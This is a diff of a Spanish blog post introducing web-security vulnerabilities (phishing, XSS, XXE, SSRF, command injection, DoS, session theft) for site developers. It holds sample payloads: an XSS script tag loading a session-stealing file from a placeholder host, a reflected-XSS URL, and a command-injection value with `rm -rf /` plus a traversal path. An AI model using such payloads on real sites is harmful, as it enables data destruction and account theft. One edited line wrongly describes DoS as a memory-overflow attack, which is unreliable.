@@ -11,7 +11,13 @@ tags:
 
 ![Alerta mimic site a la derecha](https://res.cloudinary.com/marcomadera/image/upload/q_auto,f_auto,c_scale,h_271,w_319/v1618256076/Blog/seguridad-web/Ingenier%C3%ADa_social_yav5tv.png)
 
-Te llega un correo electrónico que parece proceder de tu banco u otro servicio popular de internet como Google. Te solicita que confirmes información sensible sobre tu cuenta. El correo electrónico parece legítimo, ninguna señal de alerta del servicio de que el correo pueda ser peligroso o spam. El link parece muy realista tiene HTTPS, entonces das clic al link para saber más. Entras a la página, pero no carga porque te interrumpe una alerta del sitio y te das cuenta de que pudiste ser víctima de phishing.
+Te llega un correo electrónico que parece proceder de tu banco u otro servicio popular de internet como Google y te solicita que confirmes información sensible sobre tu cuenta.
+
+El correo electrónico parece legítimo, ninguna señal de alerta del servicio de que el correo pueda ser peligroso o spam.
+
+El link parece muy realista tiene HTTPS, entonces das clic al link para saber más. Entras a la página, pero no carga porque te interrumpe una alerta del navegador y te das cuenta de que pudiste ser víctima de phishing.
+
+Un ataque por phishing consiste en enviar un correo electrónico que pretende hacer que un usuario se registre en un sitio web, pero que el correo electrónico es una falsificación de un correo electrónico real.
 
 ## ¿Qué es la seguridad Web?
 
@@ -19,7 +25,7 @@ La seguridad web es la práctica de implementar medidas para proteger un sitio w
 
 Existen muchas razones para que tu sitio web sea vulnerable, de las cuales vamos a poner unas cuantas sobre la mesa.
 
-## Manejo de datos
+## Validación y manejo de datos
 
 La validación de datos es el paso que verifica las entradas de usuario. En este paso se asegura que los datos sean los requeridos para que puedan ser procesados correctamente y se ingresen en una base de datos.
 
@@ -62,19 +68,23 @@ Un mal manejo de datos es una vulnerabilidad potencial. Enviar datos que no son 
 
 ## Cross-site scripting (XSS)
 
-Tal vez te suene si has visto una alerta en algunos sitios web en la consola.
+Una vulnerabilidad de XSS es una vulnerabilidad que se produce cuando un sitio web recibe una entrada de usuario que contiene un código malicioso o se inyecta directamente en el navegador.
 
-![Alerta xss](https://res.cloudinary.com/marcomadera/image/upload/q_auto,f_auto,c_scale,h_227,w_705/v1618249299/Blog/seguridad-web/self-xss_axzj76.png)
+### Ataque XSS persistente
 
-Esta es una vulnerabilidad de XSS y ocurre cuando se inyecta código en el cliente. Existe dos tipos: persistente y no persistente.
-
-Imagina que la sección de comentarios de este post aceptara etiquetas HTML como la de `<script>`. Se pudiera comentar algo como lo siguiente: `<script src="http://sitioweb/robarsesiones.js">`. Entonces el script se ejecutará cada vez que alguien abra el post. Este es un tipo de ataque persistente porque está inyectado de manera permanente en el sitio web.
-
-Un ejemplo no persistente sería si al tener un buscador no validar la query, permitir que la siguiente URL `https://marcomadera.com/search?q=<script%20type='application/javascript'>alert('xss');</script>` ejecute el código.
+Imagina que la sección de comentarios de este post aceptara etiquetas HTML como la de `<script>`. Se pudiera comentar algo como lo siguiente: `<script src= "http://sitioweb/robarsesiones.js">`. Entonces el script se ejecutará cada vez que alguien abra el post. Este es un tipo de ataque persistente porque está inyectado de manera permanente en el sitio web.
 
 El siguiente ejemplo de crear un tweet que se hace retweet cada vez que aparece en pantalla, sería persistente en cuanto aparezca en el _feed_ de una persona haría retweet por si solo.
 
 <youtube id="zv0kZKC6GAM"></youtube>
+
+### Ataque XSS no persistente
+
+El ataque no persistente es aquel en el que el código malicisioso se ejecuta desde el navegador de la victima. Una de la formas de inyectar código es a travez de la consola del navegador. Tal vez te suene si has visto una alerta en algunos sitios web en la consola.
+
+![Alerta XSS en la consola](https://res.cloudinary.com/marcomadera/image/upload/q_auto,f_auto,c_scale,h_227,w_705/v1618249299/Blog/seguridad-web/self-xss_axzj76.png "Alerta XSS en la consola")
+
+Un ejemplo sería si al tener un buscador no validar la query, permitir que la siguiente URL `https://marcomadera.com/search?q=<script type= 'application/javascript'>alert('xss');</script>` ejecute el código.
 
 ## XML External Entity (XXE)
 
@@ -82,7 +92,7 @@ Un ataque de entidades externas es el tipo de ataque que abusa del procesador de
 
 > Este ataque puede conducir a la divulgación de datos confidenciales, denegación de servicio, falsificación de solicitudes del lado del servidor, escaneo de puertos desde la perspectiva de la máquina donde se encuentra el analizador y otros impactos del sistema. [Wikipedia](https://en.wikipedia.org/wiki/XML_external_entity_attack)
 
-En el sitio _secrets of app security_ hay un ejemplo claro de un ataque con saml para interceptar solicitudes y remplazarla con tu código [Ataque XXE](https://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html).
+En el blog de _secrets of app security_ hay un ejemplo claro de un ataque con saml para interceptar solicitudes y remplazarla con tu código [Ataque XXE](https://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html).
 
 Puede que recuerdes el mensaje del punto negro de WhatsApp y iMessage. Este es un ataque de este tipo que tenía oculto múltiples entidades `&lrm;` que cambian la dirección del texto y que el procesador de xml no podía soportar. Otro ataque similar a este es el llamado [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) que usa entidades `&lol;`.
 
@@ -90,7 +100,7 @@ Puede que recuerdes el mensaje del punto negro de WhatsApp y iMessage. Este es u
 
 ## Server-side request forgery (SSRF)
 
-En este tipo de ataque el atacador abusa de la funcionalidad del servidor para utilizar los recursos internos de este.
+En este tipo de ataque el atacador abusa de la funcionalidad del servidor para utilizar los recursos internos de este para hacer una solicitud al servidor.
 
 En una situación normal el _frontend_ de una tienda puede hacer llamadas al servidor para saber si un producto está disponible `http://storeapi.api/product/check`, el atacante hace peticiones al servidor modificando ese _endpoint_, por ejemplo al mismo `http://localhost/admin` abusando de la confianza.
 
@@ -100,7 +110,7 @@ En una situación normal el _frontend_ de una tienda puede hacer llamadas al ser
 
 Un ataque de inyección de comandos puede ocurrir porque el servidor no valida el input del usuario antes de usarlo en la línea de comandos.
 
-El siguiente ejemplo es un lector de archivos vulnerable que devuelve el contenido del archivo, el usuario puede insertar algo como `"filename.pdf rm -rf /"` y borrar el contenido del servidor entero o dirigirse a una ruta `"../passwords"` provocando un ataque transversal de directorio.
+El siguiente ejemplo es un lector de archivos vulnerable que devuelve el contenido del archivo, el usuario puede insertar algo como `"filename.pdf rm -rf /"` y borrar el contenido del servidor entero o dirigirse a una ruta `"../passwords"` provocando un [ataque transversal de directorio](https://en.wikipedia.org/wiki/Directory_traversal_attack "Directory traversal attack- Wikipedia").
 
 ```javascript
 app.get("/viewer", (req, res) => {
@@ -118,11 +128,11 @@ app.get("/viewer", (req, res) => {
 
 El objetivo de este ataque es la sobrecarga de los recursos del sistema para que sea inaccesible a los usuarios. La manera en que funciona es que satura los puertos con más datos de los que puede soportar, entonces al no poder con tantas solicitudes deniega el acceso a los demás usuarios.
 
-Estos ataques son comunes por su facilidad de explotar. Existen servicios como Google Cloud Armor y CloudFlare para proteger el sitio web.
+Este ataque es una forma de ataque de desbordamiento de memoria comúnmente utilizado por su facilidad de explotar. Existen servicios como Google Cloud Armor y CloudFlare para proteger el sitio web.
 
 ## Robo de sesión
 
-Esta explotación es para un obtener acceso no autorizado a información o servicios regularmente teniendo acceso a las cookies y robándolas para así autenticarse.
+Esta explotación es para obtener acceso no autorizado a información o servicios, regularmente teniendo acceso a las cookies y robándolas para así autenticarse y obtener información privada.
 
 <youtube id="UR_i5XSAKrg" ></tweet>
 
@@ -136,7 +146,7 @@ La legislación mexicana obliga a las empresas que tratan con datos personales, 
 
 Así como en esta vulnerabilidad mis datos se han visto comprometidos en otras 6 empresas como Bookmate, Nitro, Wattpad y YouNow. De ninguna he tenido ningún aviso para tomar alguna precaución. Por suerte existen páginas como [haveibeenpwned](https://haveibeenpwned.com/) donde te puedes enterar si has sido víctima de estas vulneraciones.
 
-Otra filtración reciente fue sobre el funcionamiento del navegador de Brave en modo privado con Tor. El funcionamiento es que oculta tu identidad al navegar, pero el navegador enviaba las direcciones que visitabas al proveedor DNS en lugar de enviarlo a los servidores de Tor.
+Otro tipo de filtración reciente fue sobre el funcionamiento del navegador de Brave en modo privado con Tor. El funcionamiento es que oculta tu identidad al navegar, pero el navegador enviaba las direcciones que visitabas al proveedor DNS en lugar de enviarlo a los servidores de Tor.
 
 <tweet id="1362737949872431108" ></tweet>
 
